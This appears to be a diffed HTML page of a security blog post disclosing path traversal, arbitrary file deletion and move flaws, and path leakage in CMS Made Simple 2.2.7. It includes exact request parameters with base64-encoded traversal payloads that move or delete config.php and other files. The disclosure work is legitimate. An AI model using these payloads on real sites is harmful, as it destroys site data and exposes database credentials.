+<h2 id="0x11-cms-made-simple-cmsms-227-file-rename-operation-in-the-admin-dashboard-contains-sensitive-information-disclosure-vulnerability-that-can-cause-dosadmin-user">0x11 CMS Made Simple (CMSMS) &lt;=2.2.7 “file rename” operation in the admin dashboard contains sensitive information disclosure vulnerability that can cause DOS(admin user)</h2>
+
+<p>In \modules\FileManager\action.fileaction.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d24331809.png" /></p>
+
+<p>Enter the file rename process when m1_fileactionrename parameter exists or its value is rename.</p>
+
+<p>Call \modules\FileManager\action.rename.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2475369d.png" /></p>
+
+<p>Line 31 verifies the new file name and cannot contain characters such as .., /, \, php to prevent .php file generation.</p>
+
+<p>Line 40 gets the file name to be renamed, and $oldname comes from line 26</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d243311e6.png" /></p>
+
+<p><code class="highlighter-rouge">$oldname</code> is handled by the decodefilename function, but this function simply performs a base64decode on the characters without any filtering</p>
+
+<p>To sum up: hackers can move /config.php across directories to the /upload/ directory, causing websites to be inaccessible(DOS) and sensitive database information disclosure.</p>
+
+<p>Exploits: Enter</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d244cca6b.png" /></p>
+
+<p>Just select a file, click on the “Rename” operation, and then use burp to grab packets</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d249a41ee.png" /></p>
+
+<p>Modify the value of <code class="highlighter-rouge">&amp;m1_selall[]</code> to <code class="highlighter-rouge">Li4vY29uZmlnLnBocA==</code> Add <code class="highlighter-rouge">&amp;m1_newname=test</code></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2477a1f8.png" /></p>
+
+<p>Then submit the request</p>
+
+<p>/config.php has been moved to the /upload/ directory and renamed test</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2fed3939.png" /></p>
+
+<p>And the site cannot be accessed(DOS) because it lacks the config.php configuration file</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2fe60b53.png" /></p>
+
+<h2 id="0x12-cms-made-simple-cmsms-227-module-remove-operation-in-the-admin-dashboard-contains-arbitrary-file-deletion-vulnerability-that-can-cause-dosadmin-user">0x12 CMS Made Simple (CMSMS) &lt;=2.2.7 “module remove” operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)</h2>
+
+<p>In \modules\ModuleManager\action.local_remove.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2ffb7ded.png" /></p>
+
+<p>Line 11 get the absolute address of the directory to delete</p>
+
+<p>Line 13 calls recursive_delete function for recursive file deletion</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d300a7194.png" /></p>
+
+<p>To sum up: hackers can delete /lib/ all files across directories, causing websites to be inaccessible(DOS).</p>
+
+<p>Exploits: Enter</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2ff41b41.png" /></p>
+
+<p>Just select a module, click on the “Remove” operation, and then use burp to grab packets</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d2fff1abf.png" /></p>
+
+<p>Modify <code class="highlighter-rouge">m1_mod</code> to <code class="highlighter-rouge">..\test</code> to delete all files under /test/ (the directories and files are created for testing)</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d300cdf0f.png" /></p>
+
+<h2 id="0x13-cms-made-simple-cmsms-227-file-delete-operation-in-the-admin-dashboard-contains-arbitrary-file-deletion-vulnerability-that-can-cause-dosadmin-user">0x13 CMS Made Simple (CMSMS) &lt;=2.2.7 “file delete” operation in the admin dashboard contains arbitrary file deletion vulnerability that can cause DOS(admin user)</h2>
+
+<p>In \modules\FileManager\action.fileaction.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d300a6464.png" /></p>
+
+<p>Enter the file deletion process when there is a m1_fileactiondelete parameter or its value is delete.</p>
+
+<p>Call \modules\FileManager\action.delete.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3004bc36.png" /></p>
+
+<p>Line 17 gets the file name and calls the base64decode function to decode</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3004c252.png" /></p>
+
+<p>Line 29 gets the absolute address of the file</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f355e29.png" /></p>
+
+<p>Line 30 determines if the file exists</p>
+
+<p>Line 32 determines whether the file is writable</p>
+
+<p>Lines 37-43 determine that it is a directory and the directory is not empty</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f3031ed.png" /></p>
+
+<p>Line 57 deletes the file</p>
+
+<p>To sum up: the whole process, after getting the file name submitted by the user, CMSMS will use base64decode function to decode it, and then only judge the existence of the file and the file can be written,the hacker can delete arbitrary files and cause dos.</p>
+
+<p>Exploits: Enter</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f354353.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f36a0ff.png" /></p>
+
+<p>Just select a file, click on the “Delete” operation, and then use burp to grab packets</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f3557be.png" /></p>
+
+<p>Add <code class="highlighter-rouge">&amp;m1_submit=submit</code></p>
+
+<p>Modify <code class="highlighter-rouge">m1_selall[]</code> to <code class="highlighter-rouge">Li5cbGliXHRlc3QucGhw</code></p>
+
+<p>Submit the request, the \lib\test.php(files created for testing) file will be deleted</p>
+
+<h2 id="0x14-cms-made-simple-cmsms-227-file-move-operation-in-the-admin-dashboard-contains-arbitrary-file-movement-vulnerability-that-can-cause-dosadmin-user">0x14 CMS Made Simple (CMSMS) &lt;=2.2.7 “file move” operation in the admin dashboard contains arbitrary file movement vulnerability that can cause DOS(admin user)</h2>
+
+<p>In \modules\FileManager\action.fileaction.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f386729.png" /></p>
+
+<p>Enter the file move process when there is a m1_fileactionmove parameter or its value is move.</p>
+
+<p>Call \modules\FileManager\action.move.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f32bab9.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f35495d.png" /></p>
+
+<p>Get the file name processed by the base64decode function</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f32c10f.png" /></p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d3f354eff.png" /></p>
+
+<p>Get the destination directory and determine the file write permissions</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d19382b.png" /></p>
+
+<p>Judging the source file exists and the source file is readable</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d09d689.png" /></p>
+
+<p>Line 85 directly renames the file</p>
+
+<p>To sum up: the whole process, after getting the file name submitted by the user, CMSMS will use base64decode function to decode it, and then only judge the existence of the file and the file readable,hackers can move /config.php to other directories resulting in website DOS.</p>
+
+<p>Exploits: Enter</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d69b35ac8.png" /></p>
+
+<p>Just select a file, click on the “Move” operation, and then use burp to grab packets</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d4a0b8c.png" /></p>
+
+<p>Modify <code class="highlighter-rouge">m1_selall=</code> to <code class="highlighter-rouge">m1_selall[]=Li5cY29uZmlnLnBocA==</code></p>
+
+<p><code class="highlighter-rouge">m1_destdir=/NCleanBlue</code></p>
+
+<p>Submit the request, /config.php becomes /upload/config.php</p>
+
+<p>Request /index.php and display it as follows</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d192b1e.png" /></p>
+
+<h2 id="0x15-cms-made-simple-cmsms-227-contains-web-site-physical-path-leakage-vulnerability">0x15 CMS Made Simple (CMSMS) &lt;=2.2.7 contains web Site physical path leakage Vulnerability</h2>
+
+<p>the following links can get the absolute path to the site</p>
+
+<p>/modules/DesignManager/action.ajax_get_templates.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d303b23.png" /></p>
+
+<p>/modules/DesignManager/action.ajax_get_stylesheets.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d475786.png" /></p>
+
+<p>/modules/FileManager/dunzip.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d3868bb.png" /></p>
+
+<p>/modules/FileManager/untgz.php</p>
+
+<p><img src="https://i.loli.net/2018/12/06/5c08d4d4603b2.png" /></p>
+
+</div>
+</div>
+		</main>
+		
+			<footer>
+	<div id="disqus_thread"></div>
+<script>
+
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://www-symbo1-com.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</footer>
+		
+		<div style="display: none;">
+        	<script src="https://s5.cnzz.com/z_stat.php?id=1275488238&web_id=1275488238" language="JavaScript"></script>
+    	</div>
+	</body>
+</html>
